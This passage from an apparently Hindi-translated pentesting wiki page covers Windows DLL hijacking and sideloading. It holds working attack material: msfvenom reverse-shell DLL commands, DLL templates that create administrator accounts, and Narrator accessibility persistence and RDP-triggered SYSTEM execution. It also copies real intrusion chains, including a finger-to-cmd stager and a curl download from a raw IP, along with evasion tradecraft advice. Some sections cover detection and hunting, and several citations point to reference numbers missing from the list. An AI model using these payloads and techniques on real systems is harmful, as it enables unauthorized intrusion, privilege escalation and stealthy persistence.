[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जाँचेगा कि आपके पास system PATH के अंदर किसी भी folder पर write permissions हैं या नहीं।\
इस vulnerability को खोजने के लिए अन्य उपयोगी automated tools हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे ज़रूरी बातों में से एक यह होगी कि **ऐसी dll बनाएँ जो executable द्वारा उसमें से import किए जाने वाले कम-से-कम सभी functions export करे**। ध्यान दें कि DLL Hijacking, [Medium Integrity level से High **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system)** privileges escalate करने में भी उपयोगी है।** **एक valid dll कैसे बनाएँ**, इसका उदाहरण DLL hijacking पर केंद्रित इस अध्ययन में मिल सकता है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **अगले section** में आपको कुछ **basic dll codes** मिलेंगे, जिन्हें **templates** के रूप में या **बिना required functions export किए dll बनाने** के लिए उपयोग किया जा सकता है।

## **DLLs बनाना और compile करना**

### **DLL Proxifying**

मूल रूप से, **DLL proxy** ऐसी DLL है जो **लोड होने पर आपका malicious code execute कर सकती है**, और साथ ही **वास्तविक library को सभी calls relay करके** उसे **expose** कर सकती है और उसके **अपेक्षित तरीके से काम** कर सकती है।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) tool से आप **किसी executable को निर्दिष्ट करके proxify करने के लिए library चुन सकते हैं** और **proxified dll generate कर सकते हैं**, या **DLL निर्दिष्ट करके** एक **proxified dll generate कर सकते हैं**।

### **Meterpreter**

**rev shell प्राप्त करें (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter (x86) प्राप्त करें:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक user बनाएं (x86, मुझे x64 version नहीं दिखा):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### आपका अपना

कई मामलों में, आपके द्वारा compile की गई DLL को **victim process द्वारा import किए गए हर function को export करना होगा**। यदि कोई आवश्यक export मौजूद नहीं है, तो binary उसे resolve नहीं कर सकती और exploit विफल हो जाता है।

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL का user creation उदाहरण</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>thread entry के साथ वैकल्पिक C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### Export-triggered initialization वाला NativeAOT DLL

एक self-contained **.NET NativeAOT shared library** को planted native DLL के रूप में इस्तेमाल किया जा सकता है, बिना explicit `DllMain` लागू किए। `[UnmanagedCallersOnly(EntryPoint = "...")]` के साथ static C# methods export करें; जब native host इनमें से किसी compiler-generated entry point को call करता है, तो NativeAOT module को initialize करता है और exported C# body चलने से पहले `[ModuleInitializer]` method चलती है। Output के लिए अलग से .NET runtime install करने की ज़रूरत नहीं होती।<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL में अब भी वे **export names और ABI-compatible signatures** होने चाहिए जिन्हें चुना गया host वास्तव में invoke करता है। Initialization trigger करने के लिए minimal stubs पर्याप्त हो सकते हैं, लेकिन exports न होने पर loading रुक सकती है और गलत signature call को corrupt कर सकता है। Host imports की सूची बनाएँ और output का नाम host द्वारा अपेक्षित dependency name पर बदलने से पहले `dumpbin /exports payload.dll` से परिणाम validate करें।<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimal NativeAOT exported DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

प्रोजेक्ट को self-contained Windows native shared library के रूप में कॉन्फ़िगर करें:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

नाम बदली हुई DLL को कॉपी किए गए vulnerable executable के बगल में रखें और host को उस code path के ज़रिए शुरू करें जो compatible export को कॉल करता है। यह initializer तरीका जटिल काम को सीधे `DllMain` में रखने से बचाता है, लेकिन sideload की पूर्वशर्तें नहीं बदलतीं: loader को dependency को नाम से resolve करना होगा, application directory चुननी होगी, और उसे पहले KnownDLLs, पहले से लोड किए गए module, SxS redirection या प्रतिबंधित `LOAD_LIBRARY_SEARCH_*` flags के ज़रिए पूरा नहीं किया जाना चाहिए।<sup>[[26]](#references)[[30]](#references)</sup>

पारंपरिक native templates के लिए देखें [Windows C payloads](../windows-c-payloads.md)। Sideload किया गया first stage बाद में [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) कर सकता है, लेकिन यह DLL resolution का हिस्सा नहीं, बल्कि एक अलग injection technique है।

## Detection: DLL masquerading के ज़रिए library loads

Elastic Defend 9.5.0, library-load event में `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` जोड़ता है, जब लोड की गई file Microsoft-signed न हो और उसका filename, Windows/system DLL names की Elastic की cached inventory के किसी नाम से मेल खाता हो। इससे filename inventory, system-location और signature analysis endpoint sensor में हो जाते हैं; इसलिए मुख्य EQL को इस तरह संक्षिप्त किया जा सकता है:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

इस enrichment को अपने-आप में सबूत नहीं, बल्कि एक high-value pivot मानें। भरोसा तब बढ़ाएँ जब कोई signed host अपने ही **user-writable** directory से DLL लोड करे, DLL unsigned/untrusted हो, और `dll.Ext.relative_file_creation_time` दिखाए कि वह लोड होने से कुछ समय पहले बनाई गई थी। Exclusions को सटीक publisher + host process + installation path तक सीमित रखें; टकराने वाले DLL नाम को globally suppress न करें, क्योंकि वैध installers और applications निजी libraries को system-जैसे नामों के साथ ship कर सकते हैं।<sup>[[26]](#references)</sup>

जिन sensors में यह enrichment उपलब्ध नहीं है, वहाँ colliding DLL name को non-system load path, Microsoft signature के absent/untrusted होने, और file-create-to-load के कम अंतराल से correlate करके इस व्यवहार का अनुमान लगाएँ। इसके लिए DLL-name inventory को maintained रखना और `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` तथा अन्य approved deployment paths के लिए सीमित exclusions रखना आवश्यक है।<sup>[[26]](#references)</sup>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अब भी start होने पर एक अनुमानित, language-specific localization DLL को probe करता है, जिसे hijack करके arbitrary code execution और persistence हासिल की जा सकती है।<sup>[[7]](#references)</sup>

मुख्य तथ्य
- Probe path (वर्तमान builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)।
- Legacy path (पुराने builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`।
- यदि OneCore path पर attacker-controlled और writable DLL मौजूद हो, तो वह load होती है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी export की आवश्यकता नहीं है।

Procmon से खोज
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`।
- Narrator start करें और ऊपर दिए गए path को load करने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC में शांत रहना
- एक साधारण hijack से आवाज़ या UI highlight हो सकता है। शांत रहने के लिए, attach होने पर Narrator threads की सूची प्राप्त करें, main thread खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपना काम अपने thread में जारी रखें। पूरा code देखने के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility configuration के ज़रिए trigger और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए तरीकों से, Narrator शुरू करने पर planted DLL load होती है। Secure desktop (logon screen) पर, Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।

RDP से trigger होने वाला SYSTEM execution (lateral movement)
- Classic RDP security layer की अनुमति दें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host से RDP करें और logon screen पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।
- RDP session बंद होने पर execution रुक जाता है—तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप किसी built-in Accessibility Tool (AT) की registry entry (जैसे, CursorIndicator) clone करके, उसे किसी मनमाने binary/DLL की ओर इंगित करने के लिए edit कर सकते हैं, फिर उसे import करके `configuration` को उस AT name पर set कर सकते हैं। इससे Accessibility framework के तहत मनमाना execution proxy होता है।

नोट्स
- `%windir%\System32` में लिखने और HKLM values बदलने के लिए admin rights चाहिए।
- Payload का पूरा logic `DLL_PROCESS_ATTACH` में रखा जा सकता है; किसी export की ज़रूरत नहीं है।

## केस स्टडी: CVE-2025-1729 - TPQMAssistant.exe के ज़रिए Privilege Escalation

यह केस Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दिखाता है, जिसे **CVE-2025-1729** के रूप में track किया गया है।<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability का विवरण

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` में मौजूद `TPQMAssistant.exe`।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` हर दिन सुबह 9:30 बजे, logged-on user के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` को write करने की अनुमति है, जिससे local users मनमानी files डाल सकते हैं।
- **DLL Search Behavior**: यह पहले अपनी working directory से `hostfxr.dll` load करने की कोशिश करता है और DLL न मिलने पर "NAME NOT FOUND" log करता है, जो local directory को search में प्राथमिकता दिए जाने का संकेत है।

### Exploit Implementation

Attacker उसी directory में एक malicious `hostfxr.dll` stub रख सकता है और missing DLL का फ़ायदा उठाकर user के context में code execution हासिल कर सकता है:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### हमले का प्रवाह

1. एक सामान्य user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. निर्धारित task के मौजूदा user के context में सुबह 9:30 बजे चलने की प्रतीक्षा करें।
3. यदि task चलने के समय कोई administrator logged in है, तो malicious DLL medium integrity पर administrator के session में चलती है।
4. medium integrity से SYSTEM privileges तक जाने के लिए standard UAC bypass techniques को chain करें।

## केस स्टडी: MSI CustomAction Dropper + Signed Host के ज़रिए DLL Side-Loading (wsc_proxy.exe)

Threat actors अक्सर trusted, signed process के अंतर्गत payloads चलाने के लिए MSI-based droppers को DLL side-loading के साथ इस्तेमाल करते हैं।<sup>[[10]](#references)</sup>

Chain का अवलोकन
- User MSI डाउनलोड करता है। GUI install के दौरान CustomAction चुपचाप चलता है (जैसे, LaunchApplication या VBScript action) और embedded resources से अगला stage फिर से बनाता है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को एक ही directory में लिखता है (उदाहरण: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- Signed EXE शुरू होने पर, Windows DLL search order working directory से पहले wsc.dll लोड करता है, जिससे signed parent के अंतर्गत attacker code चलता है (ATT&CK T1574.001)।

MSI विश्लेषण (किन चीज़ों पर ध्यान दें)
- CustomAction table:
  - ऐसी entries देखें जो executables या VBScript चलाती हैं। उदाहरण: LaunchApplication द्वारा background में embedded file चलाने वाला संदिग्ध pattern।
  - Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables की जाँच करें।
- MSI CAB में embedded/split payloads:
  - Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
  - या lessmsi का उपयोग करें: lessmsi x package.msi C:\out
  - ऐसे कई छोटे fragments देखें जिन्हें VBScript CustomAction जोड़कर और decrypt करके इस्तेमाल करता है। सामान्य flow:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe के साथ Practical sideloading
- इन दो फ़ाइलों को एक ही फ़ोल्डर में रखें:
  - wsc_proxy.exe: वैध signed host (Avast)। यह process अपनी directory से नाम के आधार पर wsc.dll load करने का प्रयास करता है।
  - wsc.dll: attacker DLL। अगर किसी specific exports की आवश्यकता न हो, तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएं और DllMain में payload चलाते हुए आवश्यक exports को genuine library तक forward करें।
- एक minimal DLL payload बनाएं:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export requirements के लिए, एक proxying framework (जैसे DLLirant/Spartacus) का उपयोग करके ऐसी forwarding DLL बनाएँ जो आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack विफल हो सकता है।
- KnownDLLs, SxS और forwarded exports precedence को प्रभावित कर सकते हैं; host binary और export set चुनते समय इन पर विचार करना ज़रूरी है।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon, ShadowPad को deploy करने के लिए **three-file triad** का उपयोग करता है, ताकि core payload को disk पर encrypted रखते हुए वैध software जैसा दिख सके:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। हमलावर executable का नाम बदलकर उसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature वैध रहता है।
2. **Malicious loader DLL** – EXE के बगल में अपेक्षित नाम (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) के साथ रखी जाती है। यह DLL आमतौर पर ScatterBrain framework से obfuscated MFC binary होती है; इसका एकमात्र काम encrypted blob को ढूँढ़ना, उसे decrypt करना और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में रखा जाता है। Decrypted payload को memory-map करने के बाद, loader forensic evidence नष्ट करने के लिए TMP file को delete कर देता है।

Tradecraft notes:

* PE header में मूल `OriginalFileName` रखते हुए signed EXE का नाम बदलने से वह Windows binary का रूप ले सकता है, जबकि vendor signature बरकरार रहती है। इसलिए Ink Dragon की तरह `conhost.exe` जैसी दिखने वाली binaries रखें, जो वास्तव में AMD/NVIDIA utilities होती हैं।
* चूँकि executable trusted रहता है, इसलिए अधिकतर allowlisting controls के लिए केवल आपकी malicious DLL का उसके साथ रखा होना ज़रूरी है। Loader DLL को customize करने पर ध्यान दें; signed parent आम तौर पर बिना बदलाव के चल सकता है।
* ShadowPad के decryptor को TMP blob, loader के बगल में और writable स्थिति में चाहिए, ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory को writable रखें; memory में आने के बाद OPSEC के लिए TMP file को सुरक्षित रूप से delete किया जा सकता है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading को LOLBAS के साथ जोड़ते हैं, ताकि disk पर एकमात्र custom artifact, trusted EXE के बगल में रखी malicious DLL हो:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell, `cmd.exe /c` को spawn करता है, Finger server से commands लेता है और उन्हें `cmd` तक pipe करता है:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` TCP/79 से text खींचता है; `| cmd` server response को execute करता है, जिससे operators server-side second stage को बदल सकते हैं।

- **Built-in download/extract:** benign extension वाली archive download करें, उसे unpack करें, और sideload target तथा DLL को किसी random `%LocalAppData%` folder में रखें:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` progress छिपाता है और redirects को follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के ज़रिए शुरू करें, ताकि telemetry में CIM द्वारा बनाया गया process दिखे, जबकि वह साथ रखी गई DLL को load करता है:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (जैसे, `intelbq.exe`, `nearby_share.exe`); payload (जैसे, Remcos) trusted name के तहत चलता है।

- **Hunting:** जब `/p`, `/m`, और `/c` एक साथ दिखाई दें, तो `forfiles` पर alert दें; admin scripts के बाहर इसका उपयोग असामान्य है।


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल के Lotus Blossom intrusion में, NSIS-packed dropper पहुँचाने के लिए एक trusted update chain का दुरुपयोग किया गया। इसने DLL sideload और पूरी तरह memory में चलने वाले payloads को stage किया।<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** चिह्नित करता है, Bitdefender Submission Wizard का renamed `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` वहाँ drop करता है, फिर EXE launch करता है।
- Host EXE, `log.dll` import करता है और `LogInit`/`LogWrite` को call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` उसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material पहले के hash से निकाला गया), buffer को plaintext shellcode से overwrite करता है, temporary data free करता है, और उस पर jump करता है।
- IAT से बचने के लिए, loader export names को **FNV-1a basis 0x811C9DC5 + prime 0x1000193** से hash करके APIs resolve करता है, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करके salted target hashes से तुलना करता है।

Main shellcode (Chrysalis)
- `gQ2JR&9;` key से पाँच passes में add/XOR/sub दोहराकर PE-जैसे main module को decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` को dynamically load करता है।
- प्रति-character bit-rotate/XOR transforms से runtime पर DLL name strings को reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** को traverse करता है, प्रत्येक export table को 4-byte blocks में Murmur-style mixing के साथ parse करता है, और hash नहीं मिलने पर ही `GetProcAddress` का fallback इस्तेमाल करता है।

Embedded configuration & C2
- Config, dropped `BluetoothService` file में **offset 0x30808** पर मौजूद है (size **0x980**) और `qwhvb^435h&*7` key से RC4-decrypt होती है, जिससे C2 URL और User-Agent सामने आते हैं।
- Beacons dot-delimited host profile बनाते हैं, `4Q` tag जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से भेजने से पहले `vAuig34%^325hGV` key से RC4-encrypt करते हैं। Responses RC4-decrypt किए जाते हैं और tag switch से dispatch होते हैं (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)।
- Execution mode CLI args से नियंत्रित होता है: कोई args नहीं = `-i` की ओर संकेत करने वाली persistence (service/Run key) install करना; `-i` self को `-k` के साथ relaunch करता है; `-k` install छोड़कर payload चलाता है।

Alternate loader observed
- इसी intrusion में Tiny C Compiler भी drop किया गया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` चलाया गया, जिसके साथ `libtcc.dll` भी था। Attacker द्वारा दी गई C source में shellcode embedded था, जिसे compile करके memory में चलाया गया—PE को disk पर लिखे बिना। इसे इस तरह replicate करें:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- इस TCC-आधारित compile-and-run चरण ने runtime पर `Wininet.dll` import किया और एक hardcoded URL से दूसरे चरण का shellcode प्राप्त किया, जिससे ऐसा flexible loader मिला जो compiler run जैसा दिखता है।

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains में **stability engineering** जोड़ी जाती है, ताकि legitimate host बाद के stages को साफ़ तौर पर load करने के लिए पर्याप्त समय तक चलता रहे और malicious DLL load होने के बाद crash न हो।<sup>[[11]](#references)</sup>

देखा गया pattern
- अपेक्षित dependency name, जैसे `version.dll`, का इस्तेमाल करके किसी trusted EXE को malicious DLL के साथ रखें।
- Malicious DLL हर अपेक्षित export को real system DLL (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) पर **proxy** करता है, ताकि import resolution सफल रहे और host process काम करता रहे।
- Load होने के बाद, malicious DLL host entry point को **patch** करता है, ताकि main thread बाहर निकलने या process को terminate करने वाले code paths चलाने के बजाय अनंत `Sleep` loop में चला जाए।
- एक नया thread असली malicious काम करता है: अगले-stage DLL के नाम या path को decrypt करना (RC4/XOR आम हैं), फिर उसे `LoadLibrary` से launch करना।

यह क्यों मायने रखता है
- सामान्य DLL proxying API compatibility बनाए रखती है, लेकिन यह सुनिश्चित नहीं करती कि बाद के stages के लिए host पर्याप्त समय तक चलता रहेगा।
- Main thread को `Sleep(INFINITE)` में रोकना signed process को resident रखने का सरल तरीका है, जबकि loader worker thread में decryption, staging या network bootstrap करता है।
- केवल संदिग्ध `DllMain` की तलाश करने पर यह pattern छूट सकता है, क्योंकि दिलचस्प गतिविधि host entry point के patch होने और secondary thread शुरू होने के बाद होती है।

न्यूनतम workflow
1. Signed host EXE को copy करें और पता लगाएँ कि वह local directory से कौन-सी DLL resolve करता है।
2. समान functions export करने वाली proxy DLL बनाएँ और उन्हें legitimate DLL पर forward करें।
3. `DllMain(DLL_PROCESS_ATTACH)` में worker thread बनाएँ।
4. उस thread से host entry point या main thread start routine को patch करें, ताकि वह `Sleep` पर loop करे।
5. अगले-stage DLL का नाम/config decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

Defensive pivots
- ऐसे signed processes जो `version.dll` या इसी तरह की आम libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load के तुरंत बाद process entry point पर memory patches, विशेष रूप से ऐसे jumps/calls जो `Sleep`/`SleepEx` पर redirect हों।
- Proxy DLL द्वारा बनाए गए ऐसे threads जो decrypted नाम वाली दूसरी DLL पर तुरंत `LoadLibrary` call करते हैं।
- Writable staging directories, जैसे `ProgramData`, `%TEMP%` या unpacked archive paths में vendor executables के साथ रखी गई full-export proxy DLLs।

## References

- [1] [Red Canary – Intelligence Insights: जनवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe का इस्तेमाल करके Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows में DLL hijacking। C का सरल उदाहरण।](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ने Europe को निशाना बनाने वाला नया Malware तैनात किया](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: जब DLL Hijacks का सामना Windows Helpers से होता है](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT वितरित करने वाले बदलते Impersonation Campaigns का विश्लेषण](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – अभिसरित हित: दक्षिण-पूर्व एशियाई सरकार को निशाना बनाने वाले Threat Clusters का विश्लेषण](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network और एक गुप्त Offensive Operation की आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom के toolkit का गहन विश्लेषण](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens के 2026 Espionage Campaigns पर नज़र](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
